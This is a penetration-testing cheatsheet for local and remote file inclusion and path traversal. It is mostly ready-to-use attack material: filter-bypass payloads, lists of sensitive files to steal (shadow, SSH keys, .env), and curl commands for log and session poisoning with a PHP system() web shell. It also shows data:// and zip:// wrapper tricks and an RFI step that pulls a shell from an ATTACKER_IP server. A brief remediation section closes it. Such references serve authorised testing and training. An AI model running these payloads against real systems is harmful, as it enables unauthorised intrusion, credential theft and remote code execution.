# LFI & Path Traversal Cheatsheet

Minimalist reference for discovering, bypassing, exploiting, and mitigating Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal vulnerabilities.

---

## 1. Core Concepts

| Vulnerability | Mechanism | Primary Impact |
| :--- | :--- | :--- |
| **Path Traversal** | Reads arbitrary files via `../` without executing them | Information disclosure (`/etc/passwd`, `.env`, keys) |
| **LFI** | Includes & executes local files via `include()`, `require()` | Information disclosure + **RCE** (via poisoning/wrappers) |
| **RFI** | Includes & executes remote files (`allow_url_include = On`) | Direct **RCE** |

**Common Vulnerable Functions:**
* **PHP:** `include()`, `require()`, `include_once()`, `require_once()`, `file_get_contents()`, `readfile()`
* **Python:** `open()`, `os.path.join()`, `send_file()`
* **Node.js:** `fs.readFile()`, `res.sendFile()`
* **Java:** `new File()`, `FileInputStream()`

---

## 2. Discovery & Fingerprinting

1. **Entry Points:** Check `GET`/`POST` params (`?page=`, `?file=`, `?lang=`, `?view=`, `?template=`, `?doc=`, `?path=`, `?filename=`), Cookies (`language=`, `theme=`), and HTTP headers.
2. **Error Fingerprinting:** Send a non-existent value (`?page=nonexistent_123`). A PHP warning reveals:
   * **Prefix:** e.g., `languages/`
   * **Suffix:** e.g., `.php`
   * **Webroot depth:** e.g., `/var/www/html/app/` (use 8–10 `../` levels; traversal stops at `/`)
   * **OS:** `/` (Linux) vs `\` (Windows)
3. **Automated Fuzzing:**
   ```bash
   ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://<TARGET>/?page=FUZZ" -fs <ERROR_SIZE>
   ```

---

## 3. Filter Bypass Matrix

| Defense / Filter | Bypass Payload |
| :--- | :--- |
| **Unrestricted** | `../../../../../../../../etc/passwd` |
| **`../` blocked (absolute path allowed)** | `/etc/passwd` |
| **Single-pass `../` strip (`str_replace`)** | `....//....//....//etc/passwd` or `..././..././` |
| **WAF / character filter** | `%2e%2e%2f` (URL encode) or `%252e%252e%252f` (Double URL encode) |
| **Legacy Unicode / Overlong UTF-8** | `..%c0%af` or `..%ef%bc%8f` |
| **Forced directory prefix** | `languages/../../../../../etc/passwd` |
| **Forced extension (`.php`, `.png`)** | `../../../../etc/passwd%00` *(PHP < 5.3.4)* or `php://filter` |
| **Exact keyword blacklist** | `/etc/passwd/.` or `/etc/passwd/..` |

---

## 4. High-Value Target Files

* **Linux:** `/etc/passwd`, `/etc/shadow`, `/home/<user>/.ssh/id_rsa`, `/root/.bash_history`, `/var/www/html/.env`, `config.php`, `/proc/self/environ`, `/proc/self/fd/<N>`, `/proc/version`
* **Windows:** `C:\Windows\win.ini`, `C:\boot.ini`, `C:\inetpub\wwwroot\web.config`, `C:\xampp\apache\logs\access.log`

---

## 5. Exploitation & LFI2RCE

### PHP Source Code Disclosure (`php://filter`)
```bash
curl -s "http://<TARGET>/?page=php://filter/read=convert.base64-encode/resource=config.php" | base64 -d
```
*(Omit `.php` if the backend appends it automatically.)*

### Log Poisoning -> RCE
Inject raw PHP via `curl -A` or `nc` (avoid browser address bar URL-encoding):
```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>/
curl -s "http://<TARGET>/?page=../../../../var/log/apache2/access.log&cmd=id"
```
*(Alternative targets: `/var/log/nginx/access.log`, `/var/log/auth.log` via SSH username, `/var/mail/<user>`)*

### PHP Session Poisoning -> RCE
If user input is stored in `$_SESSION`:
```bash
curl -s -b "PHPSESSID=<ID>" "http://<TARGET>/?page=/var/lib/php/sessions/sess_<ID>&cmd=id"
```
*(Alternative paths: `/tmp/sess_<ID>`, `C:\Windows\Temp\sess_<ID>`)*

### Wrappers (`data://`, `zip://`, `phar://`, Filter Chains)
```bash
# data:// (requires allow_url_include = On)
curl -s "http://<TARGET>/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id"

# zip:// (Upload + LFI)
zip shell.jpg shell.php
curl -s "http://<TARGET>/?page=zip://uploads/shell.jpg%23shell&cmd=id"
```
* **PHP Filter Chains:** Chain `convert.iconv.*` filters (`synacktiv/php_filter_chain_generator`) to generate and execute PHP code in memory when `allow_url_include = Off` and no log/session files are writable.

### RFI -> RCE (`allow_url_include = On`)
```bash
echo '<?php system($_GET["cmd"]); ?>' > rce.txt
python3 -m http.server 8000
curl -s "http://<TARGET>/?page=http://<ATTACKER_IP>:8000/rce.txt&cmd=id"
```

---

## 6. Non-PHP Vectors

| Stack | Vector | Example |
| :--- | :--- | :--- |
| **Nginx** | Off-by-slash (`location /static` missing trailing `/`) | `http://<TARGET>/static../etc/passwd` |
| **Tomcat / Spring** | Path parameter normalization bypass | `..;/..;/..;/etc/passwd` |
| **Python** | `os.path.join(base, user_input)` resets `base` if input starts with `/` | `?file=/etc/passwd` |

---

## 7. Remediation

1. **Avoid Direct Paths:** Map numeric IDs (`?id=1`) to server-side file paths.
2. **Strict Allowlist:** Validate input against a fixed set of permitted filenames.
3. **Canonicalization:** Resolve `../` and symlinks (`realpath()`, `getCanonicalPath()`) before checking `startsWith(BASE_DIR + "/")`. Never rely on `getAbsolutePath()` or `str_replace("../", "")`.
